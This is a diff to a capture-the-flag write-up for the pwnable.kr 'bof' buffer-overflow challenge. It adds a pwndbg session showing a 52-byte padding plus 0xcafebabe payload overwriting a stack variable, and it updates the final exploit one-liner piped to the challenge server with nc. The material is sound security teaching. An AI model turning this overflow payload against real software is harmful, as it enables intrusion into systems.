@@ -211,10 +211,72 @@ pwndbg> x/20xw 0xffffcffc
 
 `0x41414141` is `AAAA`. We can see `0xdeadbeef` which is the data of parameter key in line 3. We need to overwrite this value with `0xcafebabe`. From the begining address of overflowme to key, it takes 52 byes (from `0xffffcffc` to `0xffff0d30`). Another note is: we need to write `0xcafebabe` in litlle endian.
 
+We can test:
+
+```
+pwndbg> r <<< $(python -c "print('A'*52+'\xbe\xba\xfe\xca')")
+Starting program: /home/tranad/pwnable.kr/bof/bof <<< $(python -c "print('A'*52+'\xbe\xba\xfe\xca')")
+overflow me : 
+
+Breakpoint 1, 0x56555654 in func ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
+ EAX  0xffffcffc ◂— 0x41414141 ('AAAA')
+ EBX  0x0
+ ECX  0xf7faf5c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
+ EDX  0xf7fb089c (_IO_stdfile_0_lock) ◂— 0x0
+ EDI  0x0
+ ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c
+ EBP  0xffffd028 ◂— 0x41414141 ('AAAA')
+ ESP  0xffffcfe0 —▸ 0xffffcffc ◂— 0x41414141 ('AAAA')
+ EIP  0x56555654 (func+40) ◂— cmp    dword ptr [ebp + 8], 0xcafebabe
+───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────
+ ► 0x56555654 <func+40>    cmp    dword ptr [ebp + 8], 0xcafebabe
+   0x5655565b <func+47>    jne    func+63 <0x5655566b>
+ 
+   0x5655565d <func+49>    mov    dword ptr [esp], 0x5655579b
+   0x56555664 <func+56>    call   system <0xf7e14200>
+ 
+   0x56555669 <func+61>    jmp    func+75 <0x56555677>
+ 
+   0x5655566b <func+63>    mov    dword ptr [esp], 0x565557a3
+   0x56555672 <func+70>    call   puts <0xf7e3eb40>
+ 
+   0x56555677 <func+75>    mov    eax, dword ptr [ebp - 0xc]
+   0x5655567a <func+78>    xor    eax, dword ptr gs:[0x14]
+   0x56555681 <func+85>    je     func+92 <0x56555688>
+ 
+   0x56555683 <func+87>    call   __stack_chk_fail <0xf7ee0b60>
+────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
+00:0000│ esp  0xffffcfe0 —▸ 0xffffcffc ◂— 0x41414141 ('AAAA')
+01:0004│      0xffffcfe4 ◂— 0x0
+... ↓
+03:000c│      0xffffcfec ◂— 0x776e9500
+04:0010│      0xffffcff0 ◂— 9 /* '\t' */
+05:0014│      0xffffcff4 —▸ 0xffffd2b0 ◂— 0x6d6f682f ('/hom')
+06:0018│      0xffffcff8 —▸ 0xf7e074a9 (__new_exitfn+9) ◂— add    ebx, 0x1a7b57
+07:001c│ eax  0xffffcffc ◂— 0x41414141 ('AAAA')
+──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
+ ► f 0 56555654 func+40
+   f 1 41414141
+   f 2 cafebabe
+   f 3        0
+Breakpoint *0x56555654
+pwndbg> x/20xw 0xffffcffc
+0xffffcffc:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd00c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd01c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd02c:	0x41414141	0xcafebabe	0x00000000	0x565556b9
+0xffffd03c:	0x00000000	0xf7faf000	0xf7faf000	0x00000000
+
+```
+
+We can clearly see that the value of `key` is overwritten with 0xcafebabe.
 
 The final command to hack it
 ```
-(python2 -c "print 52*'A'+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
+(python -c "print(52*'A'+'\xbe\xba\xfe\xca')";cat) | nc pwnable.kr 9000
 ```
 
+NOTE: Another way to do it, to test local is host program as a server, then using python program to connect to this server, which we can get and push message to server (check it more in another note using virtual enviroment)
    
